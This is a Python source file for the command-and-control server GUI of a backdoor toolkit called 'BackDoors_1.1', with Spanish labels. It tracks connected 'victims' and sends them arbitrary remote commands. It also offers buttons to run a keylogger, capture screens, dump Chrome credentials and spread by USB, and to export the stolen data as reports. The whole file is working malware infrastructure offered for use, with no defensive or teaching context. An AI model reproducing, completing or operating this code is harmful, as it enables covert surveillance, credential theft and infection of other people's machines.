# server/gui.py
# GUI profesional para BackDoors_1.1 (panel de control multi-víctima y comandos rápidos)

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading

from core.config import C2_HOST, C2_PORT
from core.comms import setup_socket_server, recv_encrypted, send_encrypted

class Victima:
    def __init__(self, sock, addr, vid):
        self.sock = sock
        self.addr = addr
        self.vid = vid
        self.info = f"{addr[0]}:{addr[1]}"
        self.status = "Conectado"

class C2GUI:
    def __init__(self, master):
        self.master = master
        self.master.title("BackDoors_1.1 C2 - Panel Pro")
        self.victimas = {}
        self.victimas_lock = threading.Lock()
        self.selected_vid = None

        # --- UI ---
        self.setup_widgets()

        # --- Red ---
        threading.Thread(target=self.accept_victims, daemon=True).start()

    def setup_widgets(self):
        # Frame víctimas
        frame_victimas = ttk.Frame(self.master)
        frame_victimas.pack(fill="x", padx=10, pady=5)

        self.tree = ttk.Treeview(frame_victimas, columns=("ID", "Info", "Status"), show="headings")
        self.tree.heading("ID", text="ID")
        self.tree.heading("Info", text="IP:Port")
        self.tree.heading("Status", text="Estado")
        self.tree.pack(side="left", fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self.on_select_victima)

        # Frame comandos rápidos
        frame_rapidos = ttk.Frame(self.master)
        frame_rapidos.pack(fill="x", padx=10, pady=(0,4))

        ttk.Button(frame_rapidos, text="Keylogger Start", command=self.keylogger_start).pack(side="left", padx=2)
        ttk.Button(frame_rapidos, text="Keylogger Dump", command=self.keylogger_dump).pack(side="left", padx=2)
        ttk.Button(frame_rapidos, text="Screen Grab", command=self.screengrab).pack(side="left", padx=2)
        ttk.Button(frame_rapidos, text="Dump Creds Chrome", command=self.creds_chrome).pack(side="left", padx=2)
        ttk.Button(frame_rapidos, text="Propagar USB", command=self.propagate_usb).pack(side="left", padx=2)

        # Frame comandos personalizados
        frame_cmd = ttk.Frame(self.master)
        frame_cmd.pack(fill="x", padx=10, pady=5)
        self.cmd_entry = ttk.Entry(frame_cmd)
        self.cmd_entry.pack(side="left", fill="x", expand=True)
        self.cmd_entry.bind("<Return>", self.send_command)
        ttk.Button(frame_cmd, text="Enviar", command=self.send_command).pack(side="left", padx=4)

        # Frame log
        frame_log = ttk.Frame(self.master)
        frame_log.pack(fill="both", expand=True, padx=10, pady=5)
        self.log = scrolledtext.ScrolledText(frame_log, height=18, state="disabled", font=("Consolas", 10))
        self.log.pack(fill="both", expand=True)
        # Botón de exportar reporte
        frame_export = ttk.Frame(self.master)
        frame_export.pack(fill="x", padx=10, pady=(2, 8))
        ttk.Button(frame_export, text="Exportar Reporte PDF/TXT", command=self.exportar_reporte).pack(side="left", padx=2)

    def accept_victims(self):
        srv_sock = setup_socket_server(C2_HOST, C2_PORT)
        vid = 1
        while True:
            sock, addr = srv_sock.accept()
            victima = Victima(sock, addr, vid)
            with self.victimas_lock:
                self.victimas[vid] = victima
            self.add_victima_tree(victima)
            threading.Thread(target=self.listen_victima, args=(victima,), daemon=True).start()
            vid += 1

    def add_victima_tree(self, victima):
        self.tree.insert("", "end", iid=victima.vid, values=(victima.vid, victima.info, victima.status))

    def on_select_victima(self, event):
        sel = self.tree.selection()
        if sel:
            self.selected_vid = int(sel[0])
        else:
            self.selected_vid = None

    def send_command(self, event=None):
        cmd = self.cmd_entry.get().strip()
        if not cmd or self.selected_vid is None:
            return
        with self.victimas_lock:
            victima = self.victimas.get(self.selected_vid)
        if not victima:
            self.write_log("No hay víctima seleccionada.\n")
            return
        try:
            send_encrypted(victima.sock, cmd.encode())
            respuesta = recv_encrypted(victima.sock)
            if respuesta:
                self.write_log(f"[{victima.vid}] > {cmd}\n{respuesta.decode(errors='ignore')}\n")
        except Exception as e:
            self.write_log(f"[!] Error: {e}\n")
            victima.status = "Desconectado"
            self.tree.set(victima.vid, column="Status", value="Desconectado")
        finally:
            self.cmd_entry.delete(0, tk.END)

    def listen_victima(self, victima):
        while True:
            try:
                data = victima.sock.recv(1)
                if not data:
                    break
            except:
                break
        victima.status = "Desconectado"
        self.tree.set(victima.vid, column="Status", value="Desconectado")
        self.write_log(f"[!] Víctima {victima.vid} desconectada.\n")

    def write_log(self, text):
        self.log.config(state="normal")
        self.log.insert("end", text)
        self.log.see("end")
        self.log.config(state="disabled")

    # ------ Comandos rápidos -------
    def keylogger_start(self):
        self._send_cmd_modular("keylogger.start")

    def keylogger_dump(self):
        self._send_cmd_modular("keylogger.dump")

    def screengrab(self):
        self._send_cmd_modular("screengrab.capture")

    def creds_chrome(self):
        self._send_cmd_modular("credentials.chrome")

    def propagate_usb(self):
        self._send_cmd_modular("propagator.usb")

    def _send_cmd_modular(self, cmd):
        if self.selected_vid is None:
            self.write_log("Selecciona una víctima.\n")
            return
        with self.victimas_lock:
            victima = self.victimas.get(self.selected_vid)
        if not victima:
            self.write_log("Víctima no encontrada.\n")
            return
        try:
            send_encrypted(victima.sock, cmd.encode())
            respuesta = recv_encrypted(victima.sock)
            if respuesta:
                self.write_log(f"[{victima.vid}] > {cmd}\n{respuesta.decode(errors='ignore')}\n")
        except Exception as e:
            self.write_log(f"[!] Error enviando {cmd}: {e}\n")
    def exportar_reporte(self):
        from server.export_report import collect_report_data, export_txt, export_pdf
        try:
            victim_info, logs, keylog, screenshots = collect_report_data()
            f_txt = export_txt(victim_info, logs, keylog, screenshots)
            f_pdf = export_pdf(victim_info, logs, keylog, screenshots)
            self.write_log(f"Reporte exportado:\n{f_pdf}\n{f_txt}\n")
            messagebox.showinfo("Reporte Exportado", f"Reportes guardados en:\n{f_pdf}\n{f_txt}")
        except Exception as e:
            self.write_log(f"Error al exportar reporte: {e}\n")
            messagebox.showerror("Error", f"Error al exportar reporte:\n{e}")

def main():
    root = tk.Tk()
    app = C2GUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
